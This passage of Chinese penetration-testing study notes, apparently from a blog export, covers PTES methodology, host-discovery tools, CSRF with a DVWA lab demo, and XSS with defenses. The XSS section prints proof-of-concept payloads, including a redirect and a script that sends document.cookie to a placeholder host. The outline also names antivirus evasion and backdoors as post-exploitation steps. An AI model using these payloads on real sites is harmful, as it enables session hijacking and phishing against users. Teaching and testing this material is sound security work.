<li>从更加宏观的角度看待安全<ul>
<li>概览安全体系的知识结构</li>
<li>明确渗透测试在其中的定位</li>
</ul>
</li>
<li>最近一次技术交流引起的思考</li>
<li>分层思想的利弊<ul>
<li>片面的认识安全<a id="more"></a></li>
<li>只追求功能的实现</li>
<li>人这一层面是问题的根源</li>
<li>静态死板的分层并不能满足所有安全的需求</li>
</ul>
</li>
</ul>
<h2 id="软件安全生命周期"><a href="#软件安全生命周期" class="headerlink" title="软件安全生命周期"></a>软件安全生命周期</h2><ul>
<li>需求<ul>
<li>安全需求</li>
</ul>
</li>
<li>设计<ul>
<li>系统架构</li>
</ul>
</li>
<li>编码<ul>
<li>编码规范</li>
</ul>
</li>
<li>测试<ul>
<li>代码审计</li>
</ul>
</li>
<li>上线<ul>
<li>部署规范</li>
</ul>
</li>
<li>运维<ul>
<li>环境审计</li>
</ul>
</li>
</ul>
<h2 id="渗透测试的意义"><a href="#渗透测试的意义" class="headerlink" title="渗透测试的意义"></a>渗透测试的意义</h2><ul>
<li>安全建设<ul>
<li>周期长</li>
<li>投入大</li>
<li>效果不尽人意</li>
</ul>
</li>
<li>渗透测试<ul>
<li>相对软件安全生命周期，逆向思维</li>
<li>从问题出发检查系统安全</li>
<li>用黑客角度审视系统</li>
<li>在资源有限的条件下效率更高<ul>
<li>中小型企业</li>
<li>IT资金投入不足，安全更不足</li>
</ul>
</li>
<li>渗透测试的目标是让系统更安全<ul>
<li>而非恶意黑客</li>
<li>部分白帽子嘲笑某系统安全方面辣鸡现象</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux简介"><a href="#Kali-Linux简介" class="headerlink" title="Kali Linux简介"></a>Kali Linux简介</h2><ul>
<li>前身是BackTrack</li>
<li>包含600+工具，仍需自己添加</li>
<li>安全从业人员专用操作系统</li>
<li>安全工具军火库</li>
<li>支持多平台，包括ARM</li>
<li>渗透测试和安全审计的平台</li>
<li>工具党问题<ul>
<li>只掌握工具不掌握原理</li>
<li>编程语言，扫描工具其实都是工具</li>
<li>不可能从0101代码层面考虑，编程语言本身也是工具</li>
<li>掌握工具使用仍是重要的</li>
</ul>
</li>
</ul>
<h2 id="渗透测试标准PETS"><a href="#渗透测试标准PETS" class="headerlink" title="渗透测试标准PETS"></a>渗透测试标准PETS</h2><ul>
<li>前期沟通<ul>
<li>不涉及技术层面</li>
<li>渗透测试的时间，地点</li>
<li>使用的工具，ddos抗压测试工具</li>
<li>目标范围，通常给出域名，是否包括其子域名</li>
</ul>
</li>
<li>信息收集<ul>
<li>技术层面</li>
<li>被动信息搜集（OSINT）<ul>
<li>域名，人员，邮箱，地址，手机号码等<ul>
<li>为了定制专属的字典，密码破解</li>
<li>本地工具<ul>
<li>nslookup、dig、whois</li>
<li>Fierce<ul>
<li>较综合工具<ul>
<li>Dns查询</li>
<li>区域传输</li>
<li>基于字典的解析记录暴力破解</li>
<li>Subtopic</li>
</ul>
</li>
</ul>
</li>
<li>Dnsrecon<ul>
<li>功能类似上者</li>
</ul>
</li>
</ul>
</li>
<li>在线网站<ul>
<li>站长之家等</li>
</ul>
</li>
</ul>
</li>
<li>搜索引擎<ul>
<li>shodan<ul>
<li>针对联网设备</li>
<li>例如，查看目标是否使用某防火墙</li>
<li>搜索联网摄像头</li>
</ul>
</li>
<li>谷歌黑客</li>
</ul>
</li>
<li>Metadata<ul>
<li>拍摄设备拍摄的照片会泄露信息，如GPS</li>
</ul>
</li>
<li>专属密码字典<ul>
<li>工具Cupp，自行安装，基于py</li>
<li>基于之前搜集的信息</li>
</ul>
</li>
</ul>
</li>
<li>主动信息搜集<ul>
<li>扫描IP地址段<ul>
<li>工具nmap</li>
<li>思路<ul>
<li>域名</li>
<li>其子域名</li>
<li>其IP地址</li>
<li>其c段IP地址</li>
<li>IP地址对应主机的端口开放情况</li>
<li>端口对应服务的版本</li>
<li>根据版本搜索漏洞库寻找已知漏洞</li>
<li>根据漏洞寻相应payload</li>
</ul>
</li>
<li>上步骤可写shell脚本，所有命令集中在同一脚本，自动化</li>
</ul>
</li>
<li>其他服务扫描<ul>
<li>除nmap扫描的中一般服务外的其他服务</li>
<li>SNMP、SMB、SMPT、WEB<ul>
<li>Snmp<ul>
<li>Onesistyone命令</li>
<li>Snmpwalk工具</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>识别防护机制<ul>
<li>LBD工具<ul>
<li>测试负载均衡</li>
</ul>
</li>
<li>Wafw00f工具<ul>
<li>测试waf是否存在</li>
</ul>
</li>
<li>Fragroute工具<ul>
<li>是否有其他IDS，IPS</li>
</ul>
</li>
<li>Nmap</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>威胁建模<ul>
<li>传统威胁建模方法<ul>
<li>资产/攻击者</li>
</ul>
</li>
<li>PETS标准威胁建模方法<ul>
<li>按照PETS，一般是非黑盒方面，不涉及技术，走访，问卷调查企业，获取相关信息</li>
<li>商业资产<ul>
<li>主要资产</li>
<li>次要资产</li>
</ul>
</li>
<li>商业流程<ul>
<li>技术支持</li>
<li>资产管理</li>
<li>人力资源</li>
<li>第三方</li>
</ul>
</li>
<li>威胁主体<ul>
<li>内部</li>
<li>外部</li>
</ul>
</li>
<li>威胁能力<ul>
<li>威胁主体的能力</li>
<li>威胁的可能性</li>
</ul>
</li>
<li>企业专有的威胁模型，而非通常的技术模型</li>
</ul>
</li>
<li>动机建模<ul>
<li>企业内部人员威胁，其动机</li>
</ul>
</li>
<li>影响建模</li>
<li>从技术黑盒的角度进行建模<ul>
<li>工具，技术，能力发现被攻击面</li>
<li>确定实施渗透的最佳路径</li>
<li>确定控制，流程，架构</li>
</ul>
</li>
<li>建立的模型结果作为渗透测试报告的一部分进行提交</li>
</ul>
</li>
<li>漏洞分析<ul>
<li>漏洞扫描<ul>
<li>系统层面<ul>
<li>Nessus</li>
<li>Openvas</li>
<li>Nexpose</li>
<li>Nmap script</li>
</ul>
</li>
<li>Web层面<ul>
<li>Nikto</li>
<li>Burpsuite</li>
<li>Owasp ZAP</li>
<li>Sqlmap</li>
</ul>
</li>
</ul>
</li>
<li>已知漏洞利用<ul>
<li>在线搜索<ul>
<li>在线搜索exp平台，如exploitdb</li>
<li>搜索引擎</li>
</ul>
</li>
<li>本地工具<ul>
<li>Searchsploit</li>
<li>Sandi</li>
<li>Armitage</li>
<li>Msf漏洞利用平台</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>渗透攻击<ul>
<li>明显技术层面</li>
<li>进行到此步发现有所不足，可能会重新建模，重新漏洞分析，反复进行，周而复始。</li>
<li>未知漏洞挖掘<ul>
<li>Fuzzing</li>
<li>Edb</li>
<li>Ollydbg</li>
</ul>
</li>
<li>常见遇到防护措施，如waf，如杀毒软件。 需要进行面杀编码绕过<ul>
<li>Webshell编码和过滤绕过</li>
<li>Metasploit工具，msfvenom一般生成的payload会被杀软识别，虚编码绕过</li>
<li>Vile-evation，功能类似上，会对payload进行编码混淆。 Kali未自带。</li>
</ul>
</li>
<li>Wifi渗透<ul>
<li>到目标办公地点进行</li>
<li>Wifite工具</li>
</ul>
</li>
<li>密码破解<ul>
<li>Hydra</li>
<li>John</li>
<li>PTH</li>
<li>Subtopic</li>
</ul>
</li>
<li>社工<ul>
<li>侧面攻击</li>
<li>Setoolkit工具</li>
</ul>
</li>
</ul>
</li>
<li>后渗透测试<ul>
<li>取得一台主机控制权后</li>
<li>扩大战果内网渗透<ul>
<li>内网扫描</li>
<li>抓包分析</li>
<li>地址欺骗</li>
</ul>
</li>
<li>本地提权</li>
<li>获取数据</li>
<li>擦除痕迹</li>
<li>留后门</li>
</ul>
</li>
<li>渗透测试报告<ul>
<li>管理层报告<ul>
<li>风险级别</li>
<li>风险分类</li>
<li>整改规划</li>
</ul>
</li>
<li>技术报告<ul>
<li>漏洞细节</li>
<li>漏洞复现</li>
<li>修补方案</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux渗透测试实践方法"><a href="#Kali-Linux渗透测试实践方法" class="headerlink" title="Kali Linux渗透测试实践方法"></a>Kali Linux渗透测试实践方法</h2><ul>
<li>简单总结<ul>
<li>安全工作的目标是实现安全</li>
<li>渗透测试的目的不是证明系统有多烂和测试者有多牛</li>
<li>PETS是安全实操的方法论，掌握标准但但不要迷信标准</li>
<li>保持学习状态，重视理论研究，多做上手实践</li>
</ul>
</li>
</ul>
<blockquote>
<h2 id="对人的安全意识教育贯穿始终"><a href="#对人的安全意识教育贯穿始终" class="headerlink" title="对人的安全意识教育贯穿始终"></a>对人的安全意识教育贯穿始终</h2></blockquote>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集_主机发现</title>
    <url>/2018/02/28/web/Web%E6%B8%97%E9%80%8F-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="主动信息收集-主机发现"><a href="#主动信息收集-主机发现" class="headerlink" title="主动信息收集_主机发现"></a>主动信息收集_主机发现</h1><h2 id="主动信息收集简介"><a href="#主动信息收集简介" class="headerlink" title="主动信息收集简介"></a>主动信息收集简介</h2><ul>
<li>直接与目标系统交互通信（被动的不会直接与目标进行交互</li>
<li>无法避免留下访问的痕迹<ul>
<li>通过日志分析可溯源</li>
</ul>
</li>
<li>使用受控的第三方进行探测<ul>
<li>使用代理或已经被控制的主机</li>
<li>做好被封杀的准备<a id="more"></a></li>
<li>使用噪声迷惑目标，淹没真实的探测流量</li>
</ul>
</li>
<li>扫描<ul>
<li>发送不同的探测，根据返回结果判断目标状态</li>
</ul>
</li>
</ul>
<h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><ul>
<li>识别存活的主机<ul>
<li>潜在的被攻击对象</li>
</ul>
</li>
<li>输出一个IP地址列表</li>
<li>2、3、4层发现</li>
</ul>
<h2 id="发现-二层发现"><a href="#发现-二层发现" class="headerlink" title="发现_二层发现"></a>发现_二层发现</h2><ul>
<li><p>简介</p>
<ul>
<li>面向：数据链路层</li>
<li>优点：扫描速度快，探测结果准确可靠</li>
<li>缺点：不可路由，只可发现本网段内的</li>
<li>使用协议：arp协议</li>
<li>主机发现时，Wireshark抓包分析流量，以加深印象</li>
</ul>
</li>
<li><p>工具之arping</p>
<ul>
<li><p>命令行工具</p>
<ul>
<li>只可跟一个IP，不可跟网段或多个地址</li>
<li>可利用shell编程，写成sh脚本，实现多个IP或一个字段的探测</li>
</ul>
</li>
<li><p>arping</p>
</li>
</ul>
</li>
</ul>
<pre><code>xxx.xxx.xxx.xxx



-c 1

- 加IP地址
- -c指定arp包的个数，即请求次数
</code></pre><ul>
<li><p>arping +网关IP -d</p>
<ul>
<li>可用于发现本网络中的arp欺骗</li>
<li>检查网关地址，若发现两个不同mac地址，则存在arp欺骗</li>
<li>-d参数，检查重复的响应（如两个不同mac地址响应同一个IP</li>
</ul>
</li>
<li><p>可结合管道符|及grep及cut，去除繁杂信息，得到特定的IP字段</p>
</li>
<li><p>可利用shell编程，写成sh脚本，实现多个IP或一个字段的探测</p>
</li>
</ul>
<ul>
<li><p>工具之nmap</p>
<ul>
<li>nmap 1.1.1.1-254 -sn<ul>
<li>ping扫描，且不对端口进行扫描</li>
<li>支持IP地址段的方式（或0/24的形式</li>
</ul>
</li>
<li>nmap -iL iplist.txt -sn<ul>
<li>跟文件，实现多个IP的扫描</li>
</ul>
</li>
<li>严格来讲，-sn参数不仅仅是二层发现<ul>
<li>不只arp</li>
<li>也会涉及dns（ptr记录查找主机名</li>
</ul>
</li>
</ul>
</li>
<li><p>工具之netdiscover</p>
<ul>
<li>简介<ul>
<li>专用于二层发现</li>
<li>可用于无线和交换网络环境</li>
<li>主动和被动探测</li>
<li>也使用arp协议</li>
</ul>
</li>
<li>主动<ul>
<li>功能类似arping和nmap的二层发现</li>
<li>netdiscover -i eth0 -r 1.1.1.0/24</li>
<li>netdiscover -l iplist.txt</li>
</ul>
</li>
<li>被动<ul>
<li>netdiscover -p</li>
<li>主动arp容易触发报警</li>
<li>不主动发包，网卡置成混杂模式，默默在网络中监听</li>
<li>其它主机发arp，其会接收到（因arp是基于广播的</li>
</ul>
</li>
</ul>
</li>
<li><p>工具之scapy</p>
<ul>
<li>简介<ul>
<li>作为python库进行调用</li>
<li>也可以作为单独的工具使用</li>
<li>抓包、分析、创建、修改、注入网络流量</li>
<li>命令行键入scapy，进入其界面<ul>
<li>若有warning信息，可能需安装其它</li>
<li>apt-get install python-gnuplot</li>
</ul>
</li>
</ul>
</li>
<li>常用<ul>
<li>ARP().display()：显示arp字段信息</li>
<li>sr1()：传入arp请求，发起请求，并返回响应</li>
</ul>
</li>
<li>大体流程（单独使用<ul>
<li>arp=ARP()：赋值给变量arp</li>
<li>arp.pdst=x.x.x.x：设置字段值（目标IP地址</li>
<li>arp.display()：查看修改后的字段值</li>
<li>res=sr1(arp)：发起请求，并将响应赋值给res变量</li>
<li>res.display()：打印出响应信息（可得目标mac地址</li>
</ul>
</li>
<li>因为作为python的库，所以可写成py脚本</li>
</ul>
</li>
</ul>
<h2 id="发现-三层发现"><a href="#发现-三层发现" class="headerlink" title="发现_三层发现"></a>发现_三层发现</h2><ul>
<li>简介<ul>
<li>优点<ul>
<li>可路由</li>
<li>速度比较快</li>
</ul>
</li>
<li>缺点<ul>
<li>速度比二层慢</li>
<li>经常被边界防火墙过滤</li>
</ul>
</li>
<li>IP协议、ICMP协议（主）</li>
</ul>
</li>
<li>工具之ping<ul>
<li>使用两种类型的icmp<ul>
<li>icmp0-15，共有16种类型</li>
<li>请求：type 8</li>
<li>响应：type 0</li>
</ul>
</li>
<li>icmp的另一应用：路由追踪traceroute<ul>
<li>Windows下是trace命令（功能类似，实现原理有差异</li>
<li>如，traceroute <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a>（返回路由器近端的接口地址</li>
<li>类似ping -R <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a>（返回路由器远端接口地址</li>
</ul>
</li>
<li>ping IP -c 4（-c指定次数</li>
<li>可结合管道符、grep、cut提取特定信息</li>
<li>也可应用于shell脚本</li>
</ul>
</li>
</ul>
<h2 id="发现-四层发现"><a href="#发现-四层发现" class="headerlink" title="发现_四层发现"></a>发现_四层发现</h2><ul>
<li>简介<ul>
<li>是四层发现阶段，而非端口扫描阶段，两者截然不同</li>
<li>虽然是四层发现，涉及tcp/udp的端口，但仅针对IP是否存活，不关注端口的状态问题，关注点还是主机是否存活</li>
<li>优点<ul>
<li>可路由且结果可靠（比三层要准确一些</li>
<li>不太可能被防火墙过滤（即使端口关闭，探测时也会有一定响应信息，故不会被过滤</li>
<li>甚至可以发现所有端口都被过滤的主机（访问国关闭端口也可能会有响应</li>
</ul>
</li>
<li>缺点<ul>
<li>基于状态过滤的防火墙可能过滤掉其扫描（但情况很少</li>
<li>全端口扫描速度慢（tcp和udp各有65535个</li>
</ul>
</li>
<li>TCP<ul>
<li>未经请求的ack-rst<ul>
<li>正常过程：SYN包-SYN+ACK-SYN，三次握手后建立连接，再请求资源传输资源等过程</li>
<li>扫描或发现时：不三次握手，直接发送一个ACK（无故发送），目标会返回RST（reset，因为前面莫名其妙的ack包）</li>
<li>基于此，通过是否有RST返回，判断目标主机是否存活（无论端口是否开放</li>
</ul>
</li>
<li>SYN-SYN+ACK或RST<ul>
<li>也可基于正常情况来判断</li>
<li>若请求端口开放，则会有syn+ack返回，主机存活</li>
<li>若端口关闭，则返回rst，主机也存活</li>
<li>若没有响应，则可认为主机不存活</li>
</ul>
</li>
</ul>
</li>
<li>UDP<ul>
<li>ICMP端口不可达/一去不复返<ul>
<li>若目标主机存活，但端口关闭，则会一个端口不可达响应</li>
<li>若目标不存活，或者目标存活但端口开放，则一去不复返，无响应</li>
<li>注：仅发现主机是否存活，不关注端口状态</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>TCP发现<ul>
<li>scapy大体流程<ul>
<li>i=IP()：构建IP包并赋值给i</li>
<li>t=TCP()：构建TCP包并赋值给t</li>
<li>r=(I/t)：合并IP和TCP，构建完整tcp请求</li>
<li>r[IP].dst=x.x.x.x：设置目标的IP地址</li>
<li>r[TCP].flags =‘A’：设置发送ack</li>
<li>r.display()：查看一下完整的包头信息</li>
<li>a=sr1(r)：发送构造好的请求</li>
<li>a.display()：可看到响应包中flag字段为r，即rst</li>
<li>注意<ul>
<li>若IP存活，则会返回rst类型的响应</li>
<li>若不存活，则无任何响应</li>
<li>不考虑端口的问题，即r[TCP].dport字段，无论端口开放与否，都不会影响上述判断</li>
<li>同样，可应用于python脚本</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>UDP发现<ul>
<li>scapy大体流程<ul>
<li>i=IP()：构建IP包并赋值给i</li>
<li>u=UDP()：构建UDP包并赋值给u</li>
<li>r=(I/u)：合并IP和UDP，构建完整udp请求</li>
<li>r.[UDP].dport =7777: 设置一个不常见的端口用来探测，原因看上述udp探测原理</li>
<li>a=sr1(r)：发送请求</li>
<li>a.display：显示响应信息<ul>
<li>若目标存活，则返回一个目标不可达（因为端口很怪异，一般是不开放的</li>
<li>若不存活，则无响应</li>
</ul>
</li>
</ul>
</li>
<li>可应用于py脚本</li>
<li>udp发现是不可靠的，准确性不高</li>
</ul>
</li>
<li>工具之nmap<ul>
<li>nmap 1.1.1.1-254 -PU53333 -sn<ul>
<li>基于udp中icmp的扫描（icmp端口不可达</li>
<li>跟一个不常见的端口</li>
<li>-sn表只进行四层的发现，不进行端口层面的扫描</li>
</ul>
</li>
<li>nmap 1.1.1.1-254 -PU53333 -sn<ul>
<li>基于tcp中ack的扫描</li>
<li>跟哪个端口无所谓，其打开或关闭不影响结果</li>
<li>-sn表只进行四层的发现，不进行端口层面的扫描</li>
</ul>
</li>
<li>扫描都不是绝对准确的，多种方式互相结合</li>
</ul>
</li>
<li>工具之hping3<ul>
<li>hping3 —udp 1.1.1.1 -c 1<ul>
<li>-c指定发送次数</li>
<li>—udp，基于udp，同样是利用icmp不可达</li>
</ul>
</li>
<li>hping3 1.1.1.1<ul>
<li>默认是tcp扫描</li>
<li>不是基于ack-rst的方式</li>
<li>基于flag 0-ack、rst的方式</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透-CSRF漏洞</title>
    <url>/2018/02/28/web/Web%E6%B8%97%E9%80%8F-CSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Web渗透-CSRF漏洞"><a href="#Web渗透-CSRF漏洞" class="headerlink" title="Web渗透_CSRF漏洞"></a>Web渗透_CSRF漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>cross site request forgery，跨站请求伪造</li>
<li>常与xss混淆，但实际不同</li>
<li>从信任的角度<ul>
<li>xss：利用客户端用户对站点的信任</li>
<li>csrf：利用站点对客户端的信任（服务端的站点是默认不信任客户端用户的，这里信任的是经过身份验证后的用户</li>
<li>信任方向相反<a id="more"></a></li>
</ul>
</li>
</ul>
<h2 id="简单过程"><a href="#简单过程" class="headerlink" title="简单过程"></a>简单过程</h2><ul>
<li>用户U经过身份验证，与服务端建立通信</li>
<li>黑客H构造恶意URL，通过社工诱骗U点击</li>
<li>U以正常用户的身份，在其会话过程中，访问服务端，达到H恶意目的</li>
<li>服务端没有对U的请求（实际是H的恶意请求）进行检验，造成危害，故存在csrf</li>
</ul>
<h2 id="结合社工在会话过程中实现攻击"><a href="#结合社工在会话过程中实现攻击" class="headerlink" title="结合社工在会话过程中实现攻击"></a>结合社工在会话过程中实现攻击</h2><ul>
<li>修改帐号密码，个人信息（购物时的收货地址</li>
<li>发送伪造的业务请求（购物，投票</li>
<li>强行关注他人社交账号</li>
<li>在正常用户非自愿，不知情状态下提交黑客的恶意请求</li>
</ul>
<h2 id="属于业务逻辑漏洞"><a href="#属于业务逻辑漏洞" class="headerlink" title="属于业务逻辑漏洞"></a>属于业务逻辑漏洞</h2><ul>
<li>不同于技术性漏洞（利用数据与代码界限模糊问题，html、js、系统指令或sql语句，进行代码注入</li>
<li>从技术上看，所有的请求都是正确且合法的</li>
<li>web程序存在逻辑不严谨的缺陷，归根结底是服务端的锅</li>
<li>对关键操作缺少确认机制或者二次身份认证<ul>
<li>下订单、改密码等敏感操作</li>
<li>确认机制如再次输入密码（但用户体验差）</li>
</ul>
</li>
<li>自动扫描程序无法发现此类漏洞（请求都是正确合法的</li>
</ul>
<h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><ul>
<li>受害用户已经完成身份认证（成功建立会话</li>
<li>新请求的提交不需要重新身份认证或确认机制（新请求即H的恶意请求</li>
<li>攻击者H必须了解web app请求的参数构造</li>
<li>诱使正常用户触发攻击指令（社工，诱骗使点击恶意URL</li>
</ul>
<h2 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a><strong>简单演示</strong></h2><ul>
<li>0，角色分配<ul>
<li>metasploitable充当服务器，其中dvwa为存在csrf的web app（安全等级低</li>
<li>kali作为攻击端，恶意用户H</li>
<li>win7作为正常用户端，用户U</li>
</ul>
</li>
<li>1，H访问dvwa，csrf更改密码处，截获get请求</li>
<li>2，U登录dvwa系统，与其建立会话连接</li>
<li>3，H构造html页面（如1.html）放置在自己服务器，以邮件形式发送给U（或其他社工方式）</li>
<li>4，H发送给U邮件，内含一链接xxx.xom./1.html，html文件中有一a标签，即dvwa改密码的get请求</li>
<li>5，U打开邮件中链接，点击html页面中链接，在登录dvwa的情况下，无意间更改密码</li>
</ul>
<h2 id="burp生成CSRF-poc"><a href="#burp生成CSRF-poc" class="headerlink" title="burp生成CSRF poc"></a>burp生成CSRF poc</h2><ul>
<li>改密码的请求可能是get，也可能是post</li>
<li>可以手工构造form表单，事先填好字段的value（如密码字段</li>
<li>手工构造form表单可行，但麻烦，burp可简化操作</li>
<li>可自动构造：burp-engagement tools-generate CSRF poc（请求处右键选择</li>
<li>表单构造好，思路同演示</li>
</ul>
<h2 id="自动扫描程序的检测方法"><a href="#自动扫描程序的检测方法" class="headerlink" title="自动扫描程序的检测方法"></a>自动扫描程序的检测方法</h2><ul>
<li>简介<ul>
<li>自动化扫描工具面对业务逻辑层面的漏洞有短板</li>
<li>尽管不同于其他技术性漏洞能被直接扫描到，但可从服务端验证的角度进行扫描，间接性发现是否存在</li>
<li>不是绝对的，如没有token不代表一定不安全，反之亦然</li>
</ul>
</li>
<li>在请求和响应过程中检查是否存在anti-CSRF token字段<ul>
<li>比较常见的防御手段</li>
<li>一个随机值，很难被猜测，进而增加构造的难度</li>
</ul>
</li>
<li>检查服务器是否验证anti-CSRF token的字段值<ul>
<li>只存在token，而不检验，则形同虚设</li>
<li>客户端提交一个错误的token也会通过</li>
</ul>
</li>
<li>检查token中可编辑的字符串<ul>
<li>token字段可编辑，为修改token提供可能（尽管伪造成功的可能性小</li>
</ul>
</li>
<li>检查referrer是否可伪造<ul>
<li>来自本网站的请求才可以通过</li>
<li>H的恶意网站与正常服务器必然不是同一来源</li>
</ul>
</li>
</ul>
<h2 id="防御对策"><a href="#防御对策" class="headerlink" title="防御对策"></a>防御对策</h2><ul>
<li>captcha验证码</li>
<li>anti-CSRF token</li>
<li>Referrer请求头</li>
<li>降低会话超时时间</li>
<li>如更改密码时，先输入当前密码</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透-XSS漏洞</title>
    <url>/2018/02/28/web/Web%E6%B8%97%E9%80%8F-XSS%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Web渗透-XSS漏洞"><a href="#Web渗透-XSS漏洞" class="headerlink" title="Web渗透_XSS漏洞"></a>Web渗透_XSS漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>攻击Web客户端<ul>
<li>漏洞存在于服务器端，但被攻击却是客户端用户</li>
<li>层级结构<ul>
<li>客户端</li>
<li>web服务器</li>
<li>应用程序服务器</li>
<li>数据库服务器<a id="more"></a></li>
</ul>
</li>
<li>xss便是针对客户端，而sql注入针对数据库服务器</li>
</ul>
</li>
<li>客户端脚本语言<ul>
<li>可用于弹窗告警、广告</li>
<li>主要：Javascript</li>
<li>其它小众：Vbscript，ActiveX，flash</li>
<li>浏览器上执行</li>
<li>其它<ul>
<li>服务器端存在大部分代码，为缓解其压力，部分代码交由客户端，由客户端浏览器执行，如js</li>
<li>客户端浏览器访问服务端，其会响应html、xss、jpg、js等，其中js便可在本地执行，如判断密码长度等</li>
<li>H向服务端注入恶意js代码，可以临时注入或者永久注入，服务端过滤不严格，当U访问时，会在本机执行H注入的恶意代码</li>
<li>js代码在浏览器权限是受限制的，不至于为所欲为的地步</li>
</ul>
</li>
</ul>
</li>
<li>XSS<ul>
<li>跨站脚本漏洞，所谓跨站，两层含义<ul>
<li>H利用服务端漏洞，而间接攻击客户端U</li>
<li>U的js脚本原本是由服务器下发，而攻击后运行却是的H的恶意脚本（属第三方脚本，即其它来源的脚本</li>
</ul>
</li>
<li>过程<ul>
<li>H向服务器端注入恶意脚本代码</li>
<li>通过web站点漏洞，服务器将恶意代码交由U，代码执行，实现对U的控制</li>
</ul>
</li>
<li>盗取cookie<ul>
<li>U在线</li>
<li>恶意js代码下载到U本机</li>
<li>js代码执行，将U的cookie发往远程的H的服务器</li>
</ul>
</li>
<li>重定向<ul>
<li>js代码将网站重定向到H的恶意网站</li>
<li>H的恶意网站与正常网站十分相似</li>
<li>诱使U输入账号密码登录</li>
<li>达到钓鱼效果</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><ul>
<li>与Java语言无关</li>
<li>命名完全出于市场原因</li>
<li>最流行，使用最广的客户端脚本语言</li>
</ul>
<h2 id="xss使用场景"><a href="#xss使用场景" class="headerlink" title="xss使用场景"></a>xss使用场景</h2><ul>
<li>直接嵌入html：<script>alert ()</script></li>
<li>事件标签：<body onload="alert" ()></body></li>
<li>图片标签：<img src="JavaScript:alert" ()></li>
<li>其它标签：iframe，div，link</li>
<li>DOM对象，篡改页面内容</li>
</ul>
<h2 id="攻击参与方"><a href="#攻击参与方" class="headerlink" title="攻击参与方"></a>攻击参与方</h2><ul>
<li>攻击者H</li>
<li>被攻击者U</li>
<li>漏洞站点</li>
<li>第三方站点<ul>
<li>攻击参与站<ul>
<li>如H的xss平台</li>
<li>如重定向后的钓鱼站点</li>
</ul>
</li>
<li>其它攻击目标<ul>
<li>js将控制客户端，对其它网站进行访问</li>
<li>若流量过大，造成DDos效果</li>
<li>A是大站，存在xss，js将流量导至小站B，B扛不住</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="漏洞形成的根源"><a href="#漏洞形成的根源" class="headerlink" title="漏洞形成的根源"></a>漏洞形成的根源</h2><ul>
<li>服务器对用户提交数据过滤不严格</li>
<li>提交给服务器的脚本直接返回给其他客户端执行</li>
<li>脚本在客户端进行恶意操作</li>
</ul>
<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul>
<li>反射型（非持久性</li>
<li>存储型xss（持久型<ul>
<li>长期存储于服务端（数据库</li>
<li>典型场景留言板</li>
<li>每次用户访问都会被执行javascript脚本</li>
<li>其它同反射型类似</li>
</ul>
</li>
<li>DOM型</li>
</ul>
<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><ul>
<li>检测xss是否存在<ul>
<li><script>alert ()</script></li>
<li><a href>type</a></li>
<li><img src="http://1.1.1.1/a.jpg" alt="img"></li>
</ul>
</li>
<li>利用xss可做到<ul>
<li><script>window.location=‘http://1.1.1.1/’</script></li>
<li><iframe src="xxx" height="0" width="0"></iframe> - 不仅js，也可以插入iframe标签，img标签等 - 只要是对外部网站进行访问，都可用于重定向</li>
<li><script>new Image().src=xxx+document.cookie;</script></li>
<li><script>document.body.innerHTML=xxx</script></li>
</ul>
</li>
<li>注意<ul>
<li>直接注入js代码太过麻烦（万一js代码量巨大</li>
<li>注入js脚本地址，大量代码写在脚本中</li>
<li>如盗取cookie的脚本<ul>
<li><script> src=http://xxx/a.js </script></li>
<li>a.js源码<ul>
<li>var img =new Image();</li>
<li>img.src=“<a href="http://xxx/cookie.php?cookie=%E2%80%9C+document.cookie" target="_blank" rel="noopener">http://xxx/cookie.php?cookie=“+document.cookie</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="漏洞测试简单思路"><a href="#漏洞测试简单思路" class="headerlink" title="漏洞测试简单思路"></a>漏洞测试简单思路</h2><ul>
<li>客户端向服务器端输入数据（或代码</li>
<li>在响应页面搜索输入的数据</li>
<li>服务器端原样返回给客户端，则判断存在（或经过简单过滤后</li>
<li>客户端输入与服务端输出是否一致的问题</li>
<li>尽量找出所有可提交的变量，逐一测试</li>
</ul>
<h2 id="键盘记录功能"><a href="#键盘记录功能" class="headerlink" title="键盘记录功能"></a>键盘记录功能</h2><ul>
<li>keylogger.js</li>
<li>keylogger.php</li>
<li>具体代码自行百度</li>
</ul>
<h2 id="xss防御相关"><a href="#xss防御相关" class="headerlink" title="xss防御相关"></a>xss防御相关</h2><ul>
<li>htmlspecialchars()<ul>
<li>输出html编码</li>
<li>&lt;变为&lt; &gt;变为&gt;</li>
